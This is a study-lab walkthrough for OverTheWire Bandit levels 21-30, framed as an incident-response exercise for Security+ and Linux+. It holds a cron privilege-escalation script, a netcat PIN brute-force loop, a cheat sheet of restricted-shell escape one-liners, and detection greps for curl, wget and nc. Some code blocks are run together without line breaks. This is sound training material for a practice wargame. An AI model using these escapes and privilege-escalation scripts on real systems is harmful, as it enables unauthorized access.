---
title: "Bandit Levels 21-30: Advanced Linux Forensics and Scripting"
difficulty: Advanced
Cert:
  - Sec+
  - Linux+
Exam-Objectives:
  - Sec+ 4.1
  - Sec+ 4.4
  - Sec+ 4.5
  - Lin+ 1.4
  - Lin+ 3.1
created: 2026-02-13
completed:
time-hours: 3
complete: false
GitHub-ready: false
evidence-files: 10
notes:
tags:
  - linux
  - bash-scripting
  - cron-jobs
  - git-forensics
  - shell-escaping
  - soc-analyst-skills
  - overthewire
---
---
## Scenario

You're the **senior incident responder** analyzing a sophisticated **Advanced Persistent Threat (APT)** on a Linux server. The attackers:

1. **Planted cron jobs** for persistence
2. **Modified Git repositories** to backdoor code
3. **Exploited shell escape sequences** in restricted environments
4. **Used process manipulation** to hide malicious activity

Your task is to **reconstruct the attack chain** by mastering the same techniques the adversary used. This lab simulates **advanced Linux forensics** required for **threat hunting** and **digital forensics** roles.

**Levels 21-30 cover**:

- **Cron job analysis** and exploitation
- **Git repository forensics** (commits, branches, tags)
- **Shell escaping** from restricted shells
- **Process monitoring** and manipulation
- **Advanced file operations** (symlinks, shell expansion)

## Learning Objectives

By completing Levels 21-30, you will demonstrate ability to:

- **Analyze cron jobs** for malicious scheduled tasks
- **Investigate Git repositories** for hidden credentials
- **Escape restricted shells** (command injection, PATH manipulation)
- **Monitor running processes** to identify backdoors
- **Chain Linux commands** for complex automation
- **Exploit shell expansion** and variable substitution
- **Perform code review** for security vulnerabilities

## Required Environment

### Hardware/Software

- **SSH Client**: Same as Labs 1 & 2
- **Internet Connection**: Access to `bandit.labs.overthewire.org`
- **Password from Lab 2**: Starting password for `bandit21`

### Host System

- Same as previous labs

## Deliverables

### Evidence Files (Required)

1. `bandit21-cron-job-analysis.txt` - Cron job script output
2. `bandit22-cron-script-reverse-engineering.txt` - Decoded script logic
3. `bandit23-cron-exploitation.txt` - Custom script for password retrieval
4. `bandit24-brute-force-daemon.txt` - PIN brute force attack
5. `bandit25-shell-escape-more.txt` - Escape from restricted shell via `more`
6. `bandit26-git-commit-history.txt` - Git log forensics
7. `bandit27-git-clone-password.txt` - Password in Git repo
8. `bandit28-git-branch-analysis.txt` - Hidden password in branch
9. `bandit29-git-tag-forensics.txt` - Password in Git tag
10. `bandit30-packed-refs-analysis.txt` - Git packed-refs investigation

### Documentation (Required)

- **Cron job security audit**: How to identify malicious scheduled tasks
- **Git forensics playbook**: Commands for investigating repos
- **Shell escape techniques**: Methods to break out of restricted environments

## Lab Tasks

### Level 21: Cron Job Analysis

**Connection**:

```bash
ssh bandit21@bandit.labs.overthewire.org -p 2220
```

**Objective**: Analyze cron job to find where it stores output.

#### Background: Cron Jobs

Cron executes scheduled tasks (backups, log rotation, maintenance). Attackers abuse cron for:

- **Persistence** (re-establish backdoor every hour)
- **Data exfiltration** (upload logs to C2 server daily)
- **Privilege escalation** (exploit writable cron scripts)

#### Challenge

- [ ] **List active cron jobs**:
    
    ```bash
    ls -la /etc/cron.d/
    # Output: cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
    ```
    
- [ ] **Read bandit22 cron job**:
    
    ```bash
    cat /etc/cron.d/cronjob_bandit22
    # Output:
    # @reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
    # * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
    ```
    

**Cron format**: `minute hour day month weekday user command`

- [ ] **Examine script**:
    
    ```bash
    cat /usr/bin/cronjob_bandit22.sh
    # Output:
    # #!/bin/bash
    # chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
    # cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
    ```
    
- [ ] **Read output file**:
    
    ```bash
    cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
    # Output: [password for bandit22]
    ```
    

**Evidence**: Save to `bandit21-cron-job-analysis.txt`

**🔑 Key Concept**: Check `/etc/cron.d/` for persistence mechanisms. Attackers often use predictable file names in `/tmp`.

---

### Level 22: Reverse Engineering Cron Script

**Connection**:

```bash
ssh bandit22@bandit.labs.overthewire.org -p 2220
```

**Objective**: Understand script logic to determine output filename.

#### Challenge

- [ ] **Read cron script**:
    
    ```bash
    cat /usr/bin/cronjob_bandit23.sh
    # Output:
    # #!/bin/bash
    # 
    # myname=$(whoami)
    # mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
    # 
    # echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
    # 
    # cat /etc/bandit_pass/$myname > /tmp/$mytarget
    ```
    
- [ ] **Reverse engineer filename**:
    
    ```bash
    # Script runs as bandit23, so:
    echo I am user bandit23 | md5sum | cut -d ' ' -f 1
    # Output: 8ca319486bfbbc3663ea0fbe81326349
    ```
    
- [ ] **Read password file**:
    
    ```bash
    cat /tmp/8ca319486bfbbc3663ea0fbe81326349
    # Output: [password for bandit23]
    ```
    

**Evidence**: Save to `bandit22-cron-script-reverse-engineering.txt`

**🔑 Key Concept**: Code review reveals logic flaws. MD5 hashing of predictable strings is reversible.

---

### Level 23: Cron Job Exploitation

**Connection**:

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```

**Objective**: Create script that cron job will execute to retrieve password.

#### Challenge

- [ ] **Read cron script**:
    
    ```bash
    cat /usr/bin/cronjob_bandit24.sh# Output:# #!/bin/bash# # myname=$(whoami)# # cd /var/spool/$myname/foo# echo "Executing and deleting all scripts in /var/spool/$myname/foo:"# for i in * .*;# do#     if [ "$i" != "." -a "$i" != ".." ];#     then#         echo "Handling $i"#         owner="$(stat --format "%U" ./$i)"#         if [ "${owner}" = "bandit23" ]; then#             timeout -s 9 60 ./$i#         fi#         rm -f ./$i#     fi# done
    ```
    

**Analysis**: Cron executes scripts in `/var/spool/bandit24/foo/` and deletes them.

- [ ] **Create exploit script**:
    
    ```bash
    mkdir /tmp/bandit23work
    cd /tmp/bandit23work
    
    nano exploit.sh
    ```
    
    **Script contents**:
    
    ```bash
    #!/bin/bash
    cat /etc/bandit_pass/bandit24 > /tmp/bandit23work/password.txt
    chmod 666 /tmp/bandit23work/password.txt
    ```
    
- [ ] **Make script executable and deploy**:
    
    ```bash
    chmod 777 exploit.sh
    chmod 777 /tmp/bandit23work
    
    cp exploit.sh /var/spool/bandit24/foo/
    ```
    
- [ ] **Wait for cron execution** (runs every minute):
    
    ```bash
    # Wait ~60 seconds
    cat /tmp/bandit23work/password.txt
    # Output: [password for bandit24]
    ```
    

**Evidence**: Save script and process to `bandit23-cron-exploitation.txt`

**🔑 Key Concept**: Writable cron directories = privilege escalation. Always audit cron script permissions.

---

### Level 24: Daemon Brute Force

**Connection**:

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

**Objective**: Brute force 4-digit PIN to daemon on localhost:30002.

#### Challenge

- [ ] **Create brute force script**:
    
    ```bash
    mkdir /tmp/bandit24work
    cd /tmp/bandit24work
    
    nano bruteforce.sh
    ```
    
    **Script contents**:
    
    ```bash
    #!/bin/bash
    
    password=$(cat /etc/bandit_pass/bandit24)
    
    for pin in {0000..9999}
    do
        echo "$password $pin"
    done | nc localhost 30002 > output.txt
    
    cat output.txt | grep -v "Wrong" | tail -1
    ```
    
- [ ] **Execute script**:
    
    ```bash
    chmod +x bruteforce.sh
    ./bruteforce.sh
    # Output: Correct!
    #         The password of user bandit25 is [password]
    ```
    

**Optimized version** (faster):

```bash
#!/bin/bash
password=$(cat /etc/bandit_pass/bandit24)
for pin in {0000..9999}; do
    echo "$password $pin"
done | nc localhost 30002 | grep -v "Wrong"
```

**Evidence**: Save to `bandit24-brute-force-daemon.txt`

**🔑 Key Concept**: Brute forcing is viable when keyspace is small (10,000 PINs). Use rate limiting to defend.

---

### Level 25: Shell Escape via `more` Pager

**Connection**:

```bash
ssh bandit25@bandit.labs.overthewire.org -p 2220
```

**Objective**: Escape restricted shell by exploiting `more` pager.

#### Background: Restricted Shells

Some shells (rbash) restrict:

- Changing directories (`cd` disabled)
- Modifying PATH
- Executing commands with `/` in name

Escape methods:

- Shell built-ins (`echo`, `set`)
- Text editors (`vi`, `nano`)
- Pagers (`more`, `less`)

#### Challenge

- [ ] **Examine shell**:
    
    ```bash
    cat /etc/passwd | grep bandit26# Output: bandit26:x:11026:11026::/home/bandit26:/usr/bin/showtextcat /usr/bin/showtext# Output:# #!/bin/sh# export TERM=linux# more ~/text.txt# exit 0
    ```
    

**Analysis**: Shell immediately runs `more` on text file and exits.

- [ ] **Shrink terminal window** (force `more` to paginate):
    
    ```bash
    # Resize terminal to ~5 lines tall
    ssh bandit26@bandit.labs.overthewire.org -p 2220 -i bandit26.sshkey
    ```
    
- [ ] **Escape from `more`**:
    
    ```
    While in more pager:
    1. Press 'v' to open vi editor
    2. In vi, type: :set shell=/bin/bash
    3. Then type: :shell
    4. Now in bash shell!
    ```
    
- [ ] **Read password**:
    
    ```bash
    cat /etc/bandit_pass/bandit26
    # Output: [password for bandit26]
    ```
    

**Evidence**: Save escape process to `bandit25-shell-escape-more.txt`

**🔑 Key Concept**: Text editors and pagers allow shell escapes. Audit `/etc/passwd` for non-standard shells.

---

### Level 26: Git Log Forensics

**Connection**:

```bash
ssh bandit26@bandit.labs.overthewire.org -p 2220
# Use shell escape technique from Level 25
```

**Objective**: Find password removed from Git commit history.

#### Challenge

- [ ] **Clone repository**:
    
    ```bash
    mkdir /tmp/bandit26work
    cd /tmp/bandit26work
    
    git clone ssh://bandit26-git@localhost:2220/home/bandit26-git/repo
    cd repo
    ```
    
- [ ] **Check commit history**:
    
    ```bash
    git log
    # Output:
    # commit [hash2] (HEAD -> master)
    # Author: ...
    # Date: ...
    #     fix info leak
    # 
    # commit [hash1]
    # Author: ...
    # Date: ...
    #     add missing data
    ```
    
- [ ] **View specific commit**:
    
    ```bash
    git show [hash1]
    # Output:
    # +++ b/README.md
    # +The password to level 27 is [password]
    
    git show [hash2]
    # Output:
    # -The password to level 27 is [password]
    # +The password to level 27 is [removed]
    ```
    

**Alternative (git log with patches)**:

```bash
git log -p | grep -i "password"
```

**Evidence**: Save to `bandit26-git-commit-history.txt`

**🔑 Key Concept**: Git never forgets. Use `git log -p` to find deleted secrets in commit history.

---

### Level 27-30: Git Forensics Series

#### Level 27: Password in Repository

**Connection**:

```bash
ssh bandit27@bandit.labs.overthewire.org -p 2220
```

- [ ] **Clone and search**:
    
    ```bash
    git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repocd repocat README# Output: The password to the next level is: [password for bandit28]
    ```
    

**Evidence**: `bandit27-git-clone-password.txt`

---

#### Level 28: Password in Branch

**Connection**:

```bash
ssh bandit28@bandit.labs.overthewire.org -p 2220
```

- [ ] **Check branches**:
    
    ```bash
    git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repocd repogit branch -a# Output:# * master#   remotes/origin/HEAD -> origin/master#   remotes/origin/mastergit log --oneline --all# Shows commit with "add missing data"git show [commit-hash]# Output: password = [password for bandit29]
    ```
    

**Evidence**: `bandit28-git-branch-analysis.txt`

---

#### Level 29: Password in Tag

**Connection**:

```bash
ssh bandit29@bandit.labs.overthewire.org -p 2220
```

- [ ] **Check tags**:
    
    ```bash
    git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repocd repogit tag# Output: secretgit show secret# Output: [password for bandit30]
    ```
    

**Evidence**: `bandit29-git-tag-forensics.txt`

---

#### Level 30: Packed Refs

**Connection**:

```bash
ssh bandit30@bandit.labs.overthewire.org -p 2220
```

- [ ] **Check packed-refs**:
    
    ```bash
    git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repocd repocat .git/packed-refs# Output: # [hash] refs/tags/secretgit show-ref secret# Output: [hash] refs/tags/secretgit cat-file -p [hash]# Output: [password for bandit31]
    ```
    

**Evidence**: `bandit30-packed-refs-analysis.txt`

---

## Git Forensics Playbook

### Essential Commands

**Repository Investigation**:

```bash
# Clone with full history
git clone --mirror [url]

# Show all branches
git branch -a

# Show all tags
git tag

# Show commit history
git log --all --oneline --graph --decorate

# Search commit messages
git log --grep="password"

# Search file contents across history
git log -S "password" --source --all

# Show specific commit
git show [commit-hash]

# View file at specific commit
git show [commit-hash]:path/to/file
```

**Finding Secrets**:

```bash
# Search for API keys
git log -S "API_KEY" --all -p

# Find deleted files
git log --diff-filter=D --summary | grep delete

# Check for large files (potential data exfiltration)
git rev-list --objects --all | 
  awk '{print $1}' | 
  git cat-file --batch-check | 
  sort -k3 -n | 
  tail -10
```

---

## Cron Job Security Audit

### Identification

**List all cron jobs**:

```bash
# System-wide
ls -la /etc/cron.*
cat /etc/crontab

# User-specific
for user in $(cut -f1 -d: /etc/passwd); do 
    echo "Cron for $user:"; 
    crontab -u $user -l 2>/dev/null; 
done
```

**Suspicious indicators**:

- Cron jobs running as root with writable scripts
- Network connections in cron (curl, wget, nc)
- Jobs writing to /tmp or /dev/shm (volatile storage)
- Unusual execution times (every minute = high-frequency exfil)

### Mitigation

**Harden cron directories**:

```bash
# Only root can write cron files
chmod 700 /etc/cron.*
chown root:root /etc/cron.*

# Audit cron scripts
find /etc/cron.* -type f -perm -002 -ls
```

---

## Shell Escape Techniques

### Common Escape Vectors

**Text Editors**:

```bash
# Vi/Vim
:!/bin/bash
:set shell=/bin/bash
:shell

# Nano
Ctrl+R Ctrl+X
# Then: reset; bash 1>&0 2>&0

# Emacs
M-x shell
```

**Pagers**:

```bash
# More
v (opens vi)
!/bin/bash

# Less
!/bin/bash
```

**Programming Languages**:

```bash
# Python
python -c 'import os; os.system("/bin/bash")'

# Perl
perl -e 'exec "/bin/bash";'

# Ruby
ruby -e 'exec "/bin/bash"'
```

**System Commands**:

```bash
# Find
find / -name test -exec /bin/bash \;

# AWK
awk 'BEGIN {system("/bin/bash")}'
```

---

## Security Analyst Applications

### Incident Response Scenarios

**Scenario 1: Detecting Malicious Cron Jobs**

```bash
# Find cron jobs modified in last 7 days
find /etc/cron.* -type f -mtime -7 -ls

# Check for network connections
grep -r "curl\|wget\|nc" /etc/cron.*

# Monitor cron execution logs
tail -f /var/log/syslog | grep CRON
```

**Scenario 2: Git Repository Compromise**

```bash
# Attacker pushed backdoored code
git log --author="attacker@evil.com"

# Find commits with SSH keys
git log -S "BEGIN RSA PRIVATE KEY" --all -p

# Revert malicious commit
git revert [commit-hash]
```

**Scenario 3: Privilege Escalation via Shell Escape**

```bash
# Audit user shells for non-standard values
awk -F: '$7 !~ /(bash|sh|nologin|false)/ {print $1, $7}' /etc/passwd

# Check for writable text editors with SETUID
find / -perm -4000 -type f -name "vi*" -o -name "nano" -o -name "emacs"
```

### Time Tracking

|Level|Estimated|Actual|Notes|
|---|---|---|---|
|21|10 min|___ min|Cron analysis|
|22|15 min|___ min|Script reverse engineering|
|23|20 min|___ min|Cron exploitation|
|24|20 min|___ min|Brute force attack|
|25|20 min|___ min|Shell escape|
|26|15 min|___ min|Git log forensics|
|27|10 min|___ min|Git clone|
|28|10 min|___ min|Git branches|
|29|10 min|___ min|Git tags|
|30|10 min|___ min|Git packed-refs|
|**Total**|**150 min**|**___ min**||

---

## Exam Relevance Notes

### Security+ (SY0-701) Mapping

**Objective 4.1: Security assessment tools**

- Git (version control forensics)
- Cron (persistence mechanism analysis)
- Shell escape techniques (privilege escalation)

**Objective 4.4: Data sources**

- Logs (cron execution logs)
- Version control systems (Git history)
- Configuration files (/etc/crontab, /etc/passwd)

### Linux+ (XK0-006) Mapping

**Objective 1.4: Shell scripting**

- Bash loops (for, while)
- Command substitution ($(), backticks)
- Piping and redirection

**Objective 3.1: Troubleshooting**

- Analyzing scheduled tasks
- Process monitoring
- Permission issues

---

## Submission Checklist

Congratulations on completing all 30 Bandit levels! Verify:

- [ ] All 10 evidence files documented (Levels 21-30)
- [ ] Passwords saved for Levels 21-31
- [ ] Cron job security audit completed
- [ ] Git forensics playbook documented
- [ ] Shell escape techniques summarized
- [ ] Time tracking updated

**Final Evidence Count**: 10 files  
**Passwords Collected**: 10 passwords (bandit21 → bandit31)  
**Bandit Series Complete**: Yes / No

---

## Next Steps

After completing all 3 Bandit labs:

1. **Apply to real systems**: Practice on your Linux VMs
2. **Advance to Leviathan**: Next OverTheWire challenge (focus on binary exploitation)
3. **Study for certifications**: Security+, Linux+, or OSCP
4. **Contribute to community**: Write Bandit walkthroughs (without spoiling solutions)

**Additional Resources**:

- [OverTheWire Wargames](https://overthewire.org/wargames/)
- [MITRE ATT&CK: Persistence via Cron](https://attack.mitre.org/techniques/T1053/003/)
- [Git Security Best Practices](https://docs.github.com/en/code-security)
- [Shell Escape Techniques (GTFOBins)](https://gtfobins.github.io/)

---

## Appendix: Complete Bandit Series Summary

|Lab|Levels|Focus Area|Key Skills|
|---|---|---|---|
|**Lab 1**|0-10|SSH & File Navigation|ssh, cat, find, grep, base64|
|**Lab 2**|11-20|Permissions & PrivEsc|SETUID, nmap, netcat, OpenSSL|
|**Lab 3**|21-30|Forensics & Scripting|Cron, Git, shell escaping, bash|

**Total Time**: 360 minutes (~6 hours)  
**Passwords Collected**: 31 passwords  
**Commands Mastered**: 50+ Linux utilities

**Certification Readiness**:

- ✅ Security+ (Objective 4.x - Tools & Incident Response)
- ✅ Linux+ (Objective 1.x & 2.x - Fundamentals & Permissions)
- ✅ SOC Analyst skills (log analysis, threat hunting, forensics)